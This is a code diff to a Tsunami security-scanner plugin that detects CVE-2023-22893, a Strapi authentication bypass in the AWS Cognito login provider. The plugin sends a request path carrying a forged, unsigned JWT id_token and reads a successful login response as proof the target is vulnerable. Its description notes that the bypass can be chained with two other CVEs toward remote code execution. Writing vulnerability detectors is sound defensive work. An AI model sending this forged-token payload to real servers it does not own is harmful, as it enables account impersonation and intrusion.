@@ -1,5 +1,5 @@
 /*
- * Copyright 2020 Google LLC
+ * Copyright 2023 Google LLC
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -20,6 +20,7 @@ import static com.google.common.collect.ImmutableList.toImmutableList;
 import static com.google.common.net.HttpHeaders.ACCEPT_LANGUAGE;
 import static com.google.common.net.HttpHeaders.UPGRADE_INSECURE_REQUESTS;
 import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
+import static com.google.tsunami.common.data.NetworkServiceUtils.buildWebApplicationRootUrl;
 import static com.google.tsunami.common.net.http.HttpRequest.get;
 
 import com.google.common.annotations.VisibleForTesting;
@@ -67,9 +68,8 @@ public final class Cve202322893VulnDetector implements VulnDetector {
 
   @VisibleForTesting
   static final String VULNERABLE_REQUEST_PATH =
-      "api/auth/cognito/callback?access_token=something&id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJjb2duaXRvOnVzZXJuYW1lIjoiYXV0aC1ieXBhc3MtZXhhbXBsZSIsImVtYWlsIjoibm90ZXhpc3RzQG5vdGV4aXN0LmNvbSJ9.";
+      "api/auth/cognito/callback?access_token=something&id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjb2duaXRvOnVzZXJuYW1lIjoidHN1bmFtaS1zZWN1cml0eS1zY2FubmVyIiwiZW1haWwiOiJ0c3VuYW1pLXNlY3VyaXR5LXNjYW5uZXJAZ29vZ2xlLmNvbSJ9.";
 
-  @VisibleForTesting static final int DETECTION_STRING_BY_STATUS = HttpStatus.OK.code();
   private final HttpClient httpClient;
 
   private final Clock utcClock;
@@ -80,17 +80,8 @@ public final class Cve202322893VulnDetector implements VulnDetector {
     this.utcClock = checkNotNull(utcClock);
   }
 
-  private static StringBuilder buildTarget(NetworkService networkService) {
-    StringBuilder targetUrlBuilder = new StringBuilder();
-    if (NetworkServiceUtils.isWebService(networkService)) {
-      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
-    } else {
-      targetUrlBuilder
-          .append("http://")
-          .append(toUriAuthority(networkService.getNetworkEndpoint()))
-          .append("/");
-    }
-    return targetUrlBuilder;
+  private static String buildTarget(NetworkService networkService) {
+    return buildWebApplicationRootUrl(networkService);
   }
 
   @Override
@@ -113,27 +104,31 @@ public final class Cve202322893VulnDetector implements VulnDetector {
             .addHeader(UPGRADE_INSECURE_REQUESTS, "1")
             .addHeader(ACCEPT_LANGUAGE, "en-US,en;q=0.5")
             .build();
-    String targetUrl = buildTarget(networkService).append(VULNERABLE_REQUEST_PATH).toString();
+    String targetUrl = buildTarget(networkService) + VULNERABLE_REQUEST_PATH;
     try {
       HttpResponse httpResponse =
           httpClient.send(get(targetUrl).setHeaders(httpHeaders).build(), networkService);
-      // Sample successful exploitation response
-      //
-      // {"jwt":"a jwt
-      // token","user":{"id":2,"username":"auth-bypass-example","email":"notexists@notexist.com"
-      // ,"provider":"cognito","confirmed":true,"blocked":false,"createdAt":"2023-04-28T06:56:20.344Z"
-      // ,"updatedAt":"2023-04-28T06:56:20.344Z"}}
-
-      // Sample unsuccessful exploitation response
-      //
-      // {"data":null,"error":{"status":400,"name":"ApplicationError","message":"Invalid
-      // URL","details":{}}}
-      // if no cognito authentication available
-      //
-      // {"data":null,"error":{"status":400,"name":"ApplicationError","message":"This provider is
-      // disabled","details":{}}}
-      if (httpResponse.status().code() != DETECTION_STRING_BY_STATUS
-          || httpResponse.bodyJson().isEmpty()) {
+      /*
+      if the target is vulnerable, we expect
+      ```
+      {"jwt":"a jwt
+      token","user":{"id":2,"username":"tsunami-security-scanner","email":"tsunami-security-scanner@google.com"
+      ,"provider":"cognito","confirmed":true,"blocked":false,"createdAt":"current date"
+      ,"updatedAt":"current date"}}
+      ```
+      otherwise the response will contain
+      ```
+      {"data":null,"error":{"status":400,"name":"ApplicationError","message":"Invalid
+      URL","details":{}}}
+      if no cognito authentication available
+      ```
+      or
+      ```
+      {"data":null,"error":{"status":400,"name":"ApplicationError","message":"This provider is
+      disabled","details":{}}}
+      ```
+      */
+      if (httpResponse.status().code() != 200 || httpResponse.bodyJson().isEmpty()) {
         return false;
       }
 
@@ -162,20 +157,15 @@ public final class Cve202322893VulnDetector implements VulnDetector {
                         .setPublisher("TSUNAMI_COMMUNITY")
                         .setValue("CVE_2023_22893"))
                 .setSeverity(Severity.CRITICAL)
-                .setTitle("Authentication Bypass for AWS Cognito Login Provider")
+                .setTitle("Authentication Bypass For Strapi AWS Cognito Login Provider")
                 .setDescription(
-                    "Strapi through 4.5.5 does not verify the access or ID tokens issued during the OAuth flow "
-                        + "when the AWS Cognito login provider is used for authentication.")
-                .setRecommendation("Upgrade to higher versions")
-                .addAdditionalDetails(
-                    AdditionalDetail.newBuilder()
-                        .setTextData(
-                            TextData.newBuilder()
-                                .setText(
-                                    "A remote attacker could forge an ID token that is signed using the 'None' type algorithm "
-                                        + "to bypass authentication and impersonate any user that use AWS Cognito for authentication."
-                                        + " with the help of CVE-2023-22621 and CVE-2023-22894 attackers can gain "
-                                        + "Unauthenticated Remote Code Execution on this version of Strapi"))))
+                    "Strapi before 4.5.5 does not verify the access or ID tokens issued during the OAuth flow "
+                        + "when the AWS Cognito login provider is used for authentication."
+                        + "A remote attacker could forge an ID token that is signed using the 'None' type algorithm "
+                        + "to bypass authentication and impersonate any user that use AWS Cognito for authentication."
+                        + " with the help of CVE-2023-22621 and CVE-2023-22894 attackers can gain "
+                        + "Unauthenticated Remote Code Execution on this version of Strapi")
+                .setRecommendation("Upgrade to version 4.5.6 and higher"))
         .build();
   }
 }
